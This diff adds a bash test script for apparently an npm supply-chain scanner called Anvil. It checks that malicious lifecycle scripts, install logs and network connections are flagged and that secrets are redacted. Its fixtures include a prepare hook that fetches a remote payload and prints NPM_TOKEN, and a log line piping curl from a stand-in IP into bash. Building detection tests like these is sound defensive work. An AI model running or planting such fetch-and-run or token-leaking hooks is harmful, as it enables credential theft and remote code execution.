@@ -1,0 +1,409 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+export PATH="$ROOT_DIR/scripts:$PATH"
+
+WORK_DIR="$(mktemp -d)"
+trap 'rm -rf "$WORK_DIR"' EXIT
+
+assert_jq() {
+  local filter="$1"
+  local file="$2"
+  jq -e "$filter" "$file" >/dev/null
+}
+
+mkdir -p "$WORK_DIR/project/node_modules/safe-pkg" "$WORK_DIR/project/node_modules/bad-pkg" "$WORK_DIR/project/node_modules/loadash"
+cat > "$WORK_DIR/project/node_modules/safe-pkg/package.json" <<'JSON'
+{
+  "name": "safe-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node build.js"
+  }
+}
+JSON
+cat > "$WORK_DIR/project/node_modules/bad-pkg/package.json" <<'JSON'
+{
+  "name": "bad-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "install": "node install.js",
+    "prepare": "node -e \"fetch('https://a9f3k2m8q7z1x4n6p0r5.example/payload.js'); console.log(process.env.NPM_TOKEN)\""
+  }
+}
+JSON
+cat > "$WORK_DIR/project/node_modules/bad-pkg/install.js" <<'JS'
+const cp = require("child_process");
+const fs = require("fs");
+
+console.log(process.env.NPM_TOKEN);
+cp.execSync("echo suspicious");
+fs.readFileSync(".git/config", "utf8");
+JS
+cat > "$WORK_DIR/project/node_modules/loadash/package.json" <<'JSON'
+{
+  "name": "loadash",
+  "version": "1.0.0"
+}
+JSON
+
+(
+  cd "$WORK_DIR/project"
+  anvil-scan-lifecycle-scripts > lifecycle.json
+  assert_jq '.summary.packagesWithLifecycleScripts == 2' lifecycle.json
+  assert_jq '.summary.highConfidenceFindings >= 2' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_ENV_REFERENCE" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_CHILD_PROCESS" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "JS_SECRET_FILE_REFERENCE" and .file == "install.js")' lifecycle.json
+  assert_jq '.packages[] | select(.name == "bad-pkg") | .findings[] | select(.code == "GENERATED_DOMAIN_URL" and .script == "prepare")' lifecycle.json
+  assert_jq '.policy.strict.enabled == false' lifecycle.json
+
+  ANVIL_REPORT_DIR="$WORK_DIR/project/reports" anvil-dep-report >/tmp/anvil-dep-report.out
+  assert_jq '.summary.packagesScanned == 3' reports/dependency-report.json
+  assert_jq '.summary.packagesWithLifecycleScripts == 2' reports/dependency-report.json
+  assert_jq '.summary.packagesWithMetadataFindings >= 1' reports/dependency-report.json
+  assert_jq '.summary.lowConfidenceFindings >= 1' reports/dependency-report.json
+  assert_jq '.policy.strict.riskLevel == "high"' reports/dependency-report.json
+  assert_jq '.metadataReview.registry.enabled == false' reports/dependency-report.json
+  assert_jq '.metadataReview.packages[] | select(.name == "loadash") | .findings[] | select(.code == "SUSPICIOUS_PACKAGE_NAME" and .suggestedPackage == "lodash")' reports/dependency-report.json
+  assert_jq '.metadataReview.packages[] | select(.name == "loadash") | .findings[] | select(.code == "LOW_QUALITY_PACKAGE_METADATA")' reports/dependency-report.json
+  test -s reports/dependency-report.md
+)
+
+mkdir -p "$WORK_DIR/safe-bin"
+cat > "$WORK_DIR/safe-bin/npm" <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+if [[ "$*" != "ci --ignore-scripts" ]]; then
+  echo "[anvil-test] expected npm ci --ignore-scripts, got: $*" >&2
+  exit 64
+fi
+touch "$ANVIL_SAFE_NPM_CALLED"
+SH
+chmod +x "$WORK_DIR/safe-bin/npm"
+
+(
+  cd "$WORK_DIR/project"
+  ANVIL_REPORT_DIR="$WORK_DIR/safe-reports" \
+  ANVIL_SAFE_NPM_CALLED="$WORK_DIR/safe-npm-called" \
+  PATH="$WORK_DIR/safe-bin:$PATH" \
+    anvil-npm-ci-safe >/tmp/anvil-npm-ci-safe.out
+)
+test -e "$WORK_DIR/safe-npm-called"
+assert_jq '.summary.packagesWithLifecycleScripts == 2' "$WORK_DIR/safe-reports/lifecycle-scripts.json"
+
+set +e
+(
+  cd "$WORK_DIR/project"
+  ANVIL_STRICT=true \
+  ANVIL_REPORT_DIR="$WORK_DIR/safe-strict-reports" \
+  ANVIL_SAFE_NPM_CALLED="$WORK_DIR/safe-strict-npm-called" \
+  PATH="$WORK_DIR/safe-bin:$PATH" \
+    anvil-npm-ci-safe >/tmp/anvil-npm-ci-safe-strict.out
+)
+SAFE_STRICT_STATUS=$?
+set -e
+test "$SAFE_STRICT_STATUS" = "20"
+test -e "$WORK_DIR/safe-strict-npm-called"
+assert_jq '.summary.packagesWithLifecycleScripts == 2' "$WORK_DIR/safe-strict-reports/lifecycle-scripts.json"
+
+mkdir -p "$WORK_DIR/logs"
+cat > "$WORK_DIR/logs/npm-install.log" <<'LOG'
+> bad-pkg@1.0.0 install
+curl http://198.51.100.10/payload.sh | bash
+LOG
+cat > "$WORK_DIR/logs/strace.log" <<'LOG'
+100 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 123
+123 execve("/usr/bin/sh", ["sh", "-c", "curl http://198.51.100.10/payload.sh | bash"], 0x7ffc) = 0
+123 execve("/usr/bin/curl", ["curl", "http://198.51.100.10/payload.sh"], 0x7ffc) = 0
+123 connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("198.51.100.10")}, 16) = -1 EINPROGRESS
+123 openat(AT_FDCWD, "/home/node/.npmrc", O_RDONLY) = 4
+123 openat(AT_FDCWD, "/workspace/project/.git/config", O_RDONLY) = 5
+LOG
+anvil-scan-install-logs "$WORK_DIR/logs/npm-install.log" "$WORK_DIR/logs/strace.log" > "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.high >= 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.medium >= 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.executedProcesses == 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.outboundConnections == 1' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.summary.sensitiveFileAccesses == 2' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.filesystemSummary.sensitiveAccesses[] | select(.path == "/workspace/project/.git/config")' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.processSummary.processTree[] | select(.pid == "123" and .parentPid == "100" and .command == "curl")' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION")' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "NON_STANDARD_PORT")' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.policy.network.allowedPorts == [80,443]' "$WORK_DIR/logs/ioc-report.json"
+assert_jq '.policy.strict.riskLevel == "high"' "$WORK_DIR/logs/ioc-report.json"
+
+ANVIL_NETWORK_ALLOWED_PORTS="80,443,8080" \
+ANVIL_NETWORK_ALLOWED_HOSTS="198.51.100.10" \
+  anvil-scan-install-logs "$WORK_DIR/logs/npm-install.log" "$WORK_DIR/logs/strace.log" > "$WORK_DIR/logs/ioc-allowed-network-report.json"
+test "$(jq '[.mediumConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION" or .code == "NON_STANDARD_PORT")] | length' "$WORK_DIR/logs/ioc-allowed-network-report.json")" = "0"
+
+ANVIL_NETWORK_DIRECT_IP_SEVERITY=high \
+ANVIL_NETWORK_NON_STANDARD_PORT_SEVERITY=high \
+ANVIL_NETWORK_BLOCKED_HOSTS="raw.githubusercontent.com" \
+  anvil-scan-install-logs "$WORK_DIR/logs/npm-install.log" "$WORK_DIR/logs/strace.log" > "$WORK_DIR/logs/ioc-strict-network-report.json"
+assert_jq '.highConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION")' "$WORK_DIR/logs/ioc-strict-network-report.json"
+assert_jq '.highConfidenceFindings[] | select(.code == "NON_STANDARD_PORT")' "$WORK_DIR/logs/ioc-strict-network-report.json"
+
+cat > "$WORK_DIR/logs/raw-url.log" <<'LOG'
+> package@1.0.0 install
+node -e "fetch('https://raw.githubusercontent.com/example/repo/main/install.js')"
+node -e "dns.lookup('a9f3k2m8q7z1x4n6p0r5.example')"
+node -e "fetch('https://a9f3k2m8q7z1x4n6p0r5.example/payload.js')"
+LOG
+anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/raw-url-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "RAW_OR_PASTE_SITE")' "$WORK_DIR/logs/raw-url-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "GENERATED_DOMAIN_LOOKUP" and (.evidence | contains("a9f3k2m8q7z1x4n6p0r5.example")))' "$WORK_DIR/logs/raw-url-report.json"
+assert_jq '.policy.network.generatedDomainSeverity == "medium"' "$WORK_DIR/logs/raw-url-report.json"
+ANVIL_NETWORK_GENERATED_DOMAIN_SEVERITY=off anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/generated-domain-off-report.json"
+test "$(jq '[.mediumConfidenceFindings[] | select(.code == "GENERATED_DOMAIN_LOOKUP")] | length' "$WORK_DIR/logs/generated-domain-off-report.json")" = "0"
+ANVIL_NETWORK_BLOCKED_HOSTS="raw.githubusercontent.com" anvil-scan-install-logs "$WORK_DIR/logs/raw-url.log" /dev/null > "$WORK_DIR/logs/blocked-url-report.json"
+assert_jq '.highConfidenceFindings[] | select(.code == "BLOCKED_NETWORK_HOST")' "$WORK_DIR/logs/blocked-url-report.json"
+
+ANVIL_STRICT=true anvil-risk-gate "$WORK_DIR/logs/ioc-report.json" ioc >/tmp/anvil-risk-gate-high.out && {
+  echo "[anvil] Expected high-risk IOC gate to fail" >&2
+  exit 1
+}
+test "$?" = "21"
+
+ANVIL_STRICT=true ANVIL_STRICT_RISK_LEVEL=off anvil-risk-gate "$WORK_DIR/logs/ioc-report.json" ioc
+
+cat > "$WORK_DIR/logs/medium-only-report.json" <<'JSON'
+{
+  "summary": {
+    "high": 0,
+    "medium": 1
+  },
+  "highConfidenceFindings": [],
+  "mediumConfidenceFindings": [
+    { "code": "NON_STANDARD_PORT" }
+  ]
+}
+JSON
+ANVIL_STRICT=true anvil-risk-gate "$WORK_DIR/logs/medium-only-report.json" network
+ANVIL_STRICT=true ANVIL_STRICT_RISK_LEVEL=medium anvil-risk-gate "$WORK_DIR/logs/medium-only-report.json" network >/tmp/anvil-risk-gate-medium.out && {
+  echo "[anvil] Expected medium-risk network gate to fail" >&2
+  exit 1
+}
+test "$?" = "22"
+
+cat > "$WORK_DIR/logs/array-only-high-report.json" <<'JSON'
+{
+  "highConfidenceFindings": [
+    { "code": "CREDENTIAL_FILE_ACCESS" }
+  ],
+  "mediumConfidenceFindings": [],
+  "summary": {}
+}
+JSON
+ANVIL_STRICT=true anvil-risk-gate "$WORK_DIR/logs/array-only-high-report.json" ioc >/tmp/anvil-risk-gate-array-high.out && {
+  echo "[anvil] Expected array-only high-risk IOC gate to fail" >&2
+  exit 1
+}
+test "$?" = "21"
+
+cat > "$WORK_DIR/logs/array-only-medium-report.json" <<'JSON'
+{
+  "highConfidenceFindings": [],
+  "mediumConfidenceFindings": [
+    { "code": "NON_STANDARD_PORT" }
+  ],
+  "summary": {}
+}
+JSON
+ANVIL_STRICT=true anvil-risk-gate "$WORK_DIR/logs/array-only-medium-report.json" network
+ANVIL_STRICT=true ANVIL_STRICT_RISK_LEVEL=medium anvil-risk-gate "$WORK_DIR/logs/array-only-medium-report.json" network >/tmp/anvil-risk-gate-array-medium.out && {
+  echo "[anvil] Expected array-only medium-risk network gate to fail" >&2
+  exit 1
+}
+test "$?" = "22"
+
+ANVIL_STRICT=true anvil-risk-gate "$WORK_DIR/project/lifecycle.json" lifecycle >/tmp/anvil-risk-gate-lifecycle-any.out && {
+  echo "[anvil] Expected lifecycle-any gate to fail" >&2
+  exit 1
+}
+test "$?" = "20"
+ANVIL_STRICT=true ANVIL_STRICT_LIFECYCLE_MODE=off anvil-risk-gate "$WORK_DIR/project/lifecycle.json" lifecycle
+ANVIL_STRICT=true ANVIL_STRICT_LIFECYCLE_MODE=risk ANVIL_STRICT_RISK_LEVEL=high anvil-risk-gate "$WORK_DIR/project/lifecycle.json" lifecycle >/tmp/anvil-risk-gate-lifecycle-risk.out && {
+  echo "[anvil] Expected lifecycle-risk gate to fail" >&2
+  exit 1
+}
+test "$?" = "20"
+
+mkdir -p "$WORK_DIR/submit" "$WORK_DIR/failing-curl-bin"
+cat > "$WORK_DIR/submit/report.json" <<'JSON'
+{
+  "summary": {
+    "high": 0,
+    "medium": 0
+  }
+}
+JSON
+cat > "$WORK_DIR/failing-curl-bin/curl" <<'SH'
+#!/usr/bin/env bash
+exit 22
+SH
+chmod +x "$WORK_DIR/failing-curl-bin/curl"
+set +e
+ANVIL_REGISTRY_URL="http://registry.example.test" \
+PATH="$WORK_DIR/failing-curl-bin:$PATH" \
+  anvil-submit-report "$WORK_DIR/submit/report.json" network >/tmp/anvil-submit-report.out 2>/tmp/anvil-submit-report.err
+SUBMIT_STATUS=$?
+set -e
+test "$SUBMIT_STATUS" = "22"
+test ! -e "$WORK_DIR/submit/.anvil-submit-payload.json"
+
+mkdir -p "$WORK_DIR/submit-bin"
+cat > "$WORK_DIR/submit-bin/failing-submit" <<'SH'
+#!/usr/bin/env bash
+exit 91
+SH
+chmod +x "$WORK_DIR/submit-bin/failing-submit"
+
+ANVIL_SUBMIT_REPORT_BIN="$WORK_DIR/submit-bin/failing-submit" \
+  anvil-submit-report-if-configured "$WORK_DIR/submit/report.json" network >/tmp/anvil-submit-if-unconfigured.out 2>/tmp/anvil-submit-if-unconfigured.err
+
+set +e
+ANVIL_REGISTRY_URL="http://registry.example.test" \
+ANVIL_SUBMIT_REPORT_BIN="$WORK_DIR/submit-bin/failing-submit" \
+  anvil-submit-report-if-configured "$WORK_DIR/submit/report.json" network >/tmp/anvil-submit-if-warn.out 2>/tmp/anvil-submit-if-warn.err
+SUBMIT_IF_WARN_STATUS=$?
+set -e
+test "$SUBMIT_IF_WARN_STATUS" = "0"
+
+set +e
+ANVIL_REGISTRY_URL="http://registry.example.test" \
+ANVIL_REPORT_SUBMIT_STRICT=true \
+ANVIL_SUBMIT_REPORT_BIN="$WORK_DIR/submit-bin/failing-submit" \
+  anvil-submit-report-if-configured "$WORK_DIR/submit/report.json" network >/tmp/anvil-submit-if-strict.out 2>/tmp/anvil-submit-if-strict.err
+SUBMIT_IF_STRICT_STATUS=$?
+set -e
+test "$SUBMIT_IF_STRICT_STATUS" = "91"
+
+mkdir -p "$WORK_DIR/record-curl-bin"
+cat > "$WORK_DIR/record-curl-bin/curl" <<'SH'
+#!/usr/bin/env bash
+touch "$ANVIL_CURL_CALLED"
+exit 90
+SH
+chmod +x "$WORK_DIR/record-curl-bin/curl"
+
+set +e
+ANVIL_REGISTRY_URL="http://registry.example.test" \
+ANVIL_CURL_CALLED="$WORK_DIR/curl-called-bad-type" \
+PATH="$WORK_DIR/record-curl-bin:$PATH" \
+  anvil-submit-report "$WORK_DIR/submit/report.json" "Bad Type" >/tmp/anvil-submit-report-bad-type.out 2>/tmp/anvil-submit-report-bad-type.err
+BAD_TYPE_STATUS=$?
+set -e
+test "$BAD_TYPE_STATUS" = "64"
+test ! -e "$WORK_DIR/submit/.anvil-submit-payload.json"
+test ! -e "$WORK_DIR/curl-called-bad-type"
+
+cat > "$WORK_DIR/submit/array-report.json" <<'JSON'
+[]
+JSON
+set +e
+ANVIL_REGISTRY_URL="http://registry.example.test" \
+ANVIL_CURL_CALLED="$WORK_DIR/curl-called-array-report" \
+PATH="$WORK_DIR/record-curl-bin:$PATH" \
+  anvil-submit-report "$WORK_DIR/submit/array-report.json" network >/tmp/anvil-submit-report-array.out 2>/tmp/anvil-submit-report-array.err
+ARRAY_REPORT_STATUS=$?
+set -e
+test "$ARRAY_REPORT_STATUS" = "65"
+test ! -e "$WORK_DIR/submit/.anvil-submit-payload.json"
+test ! -e "$WORK_DIR/curl-called-array-report"
+
+mkdir -p "$WORK_DIR/npmrc"
+cat > "$WORK_DIR/npmrc/.npmrc" <<'NPMRC'
+# Existing project config
+registry=https://registry.npmjs.org
+ignore-scripts=false
+@scope:registry=https://registry.example.test
+always-auth=true
+NPMRC
+ANVIL_NPMRC_PATH="$WORK_DIR/npmrc/.npmrc" anvil-use-registry "http://registry.example.test/base/" >/tmp/anvil-use-registry.out
+grep -q '^# Existing project config$' "$WORK_DIR/npmrc/.npmrc"
+! grep -q '^@scope:registry=' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^always-auth=true$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^# Managed by Anvil Node Base$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^registry=http://registry.example.test/base$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^ignore-scripts=true$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^fund=false$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^audit=true$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^save-exact=true$' "$WORK_DIR/npmrc/.npmrc"
+grep -q '^foreground-scripts=true$' "$WORK_DIR/npmrc/.npmrc"
+test "$(grep -c '^registry=' "$WORK_DIR/npmrc/.npmrc")" = "1"
+test "$(grep -c '^ignore-scripts=' "$WORK_DIR/npmrc/.npmrc")" = "1"
+
+cat > "$WORK_DIR/npmrc/preserve-scoped.npmrc" <<'NPMRC'
+@scope:registry=https://registry.example.test
+NPMRC
+ANVIL_PRESERVE_SCOPED_REGISTRIES=true \
+ANVIL_NPMRC_PATH="$WORK_DIR/npmrc/preserve-scoped.npmrc" \
+  anvil-use-registry "http://registry.example.test/base/" >/tmp/anvil-use-registry-preserve.out
+grep -q '^@scope:registry=https://registry.example.test$' "$WORK_DIR/npmrc/preserve-scoped.npmrc"
+grep -q '^registry=http://registry.example.test/base$' "$WORK_DIR/npmrc/preserve-scoped.npmrc"
+
+set +e
+ANVIL_NPMRC_PATH="$WORK_DIR/npmrc/invalid.npmrc" anvil-use-registry "https://user:pass@registry.example.test" >/tmp/anvil-use-registry-invalid.out 2>/tmp/anvil-use-registry-invalid.err
+USE_REGISTRY_STATUS=$?
+set -e
+test "$USE_REGISTRY_STATUS" = "64"
+test ! -e "$WORK_DIR/npmrc/invalid.npmrc"
+
+mkdir -p "$WORK_DIR/bin"
+cat > "$WORK_DIR/bin/strace" <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+out=""
+while [[ "$#" -gt 0 ]]; do
+  case "$1" in
+    -o)
+      out="$2"
+      shift 2
+      ;;
+    -f|-e)
+      shift
+      if [[ "${1:-}" == trace=* ]]; then shift; fi
+      ;;
+    *)
+      break
+      ;;
+  esac
+done
+"$@"
+cat > "$out" <<'LOG'
+321 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.20")}, 16) = 0
+LOG
+SH
+chmod +x "$WORK_DIR/bin/strace"
+
+cat > "$WORK_DIR/bin/npm" <<'SH'
+#!/usr/bin/env bash
+set -euo pipefail
+echo "> observed-pkg@1.0.0 install"
+echo "node install.js"
+SH
+chmod +x "$WORK_DIR/bin/npm"
+
+(
+  cd "$WORK_DIR/project"
+  ANVIL_REPORT_DIR="$WORK_DIR/observed" \
+  AWS_ACCESS_KEY_ID="access-key" \
+  NPM_TOKEN="very-secret" \
+  PATH="$WORK_DIR/bin:$PATH" \
+    anvil-npm-ci-observed >/tmp/anvil-npm-ci-observed.out
+)
+assert_jq '.environment.AWS_ACCESS_KEY_ID == "[redacted]"' "$WORK_DIR/observed/environment-snapshot.json"
+assert_jq '.environment.NPM_TOKEN == "[redacted]"' "$WORK_DIR/observed/environment-snapshot.json"
+assert_jq '.redaction | contains("redacted")' "$WORK_DIR/observed/environment-snapshot.json"
+assert_jq '.summary.outboundConnections == 1' "$WORK_DIR/observed/ioc-report.json"
+test -s "$WORK_DIR/observed/ioc-report.md"
+
+ANVIL_REPORT_DIR="$WORK_DIR/network" PATH="$WORK_DIR/bin:$PATH" anvil-network-monitor -- node -e "process.exit(0)" >/tmp/anvil-network-monitor.out
+assert_jq '.summary.outboundConnections == 1' "$WORK_DIR/network/network-report.json"
+assert_jq '.mediumConfidenceFindings[] | select(.code == "DIRECT_IP_CONNECTION")' "$WORK_DIR/network/network-report.json"
+test -s "$WORK_DIR/network/network-report.md"
+
+echo "[anvil] Node Base script tests passed"
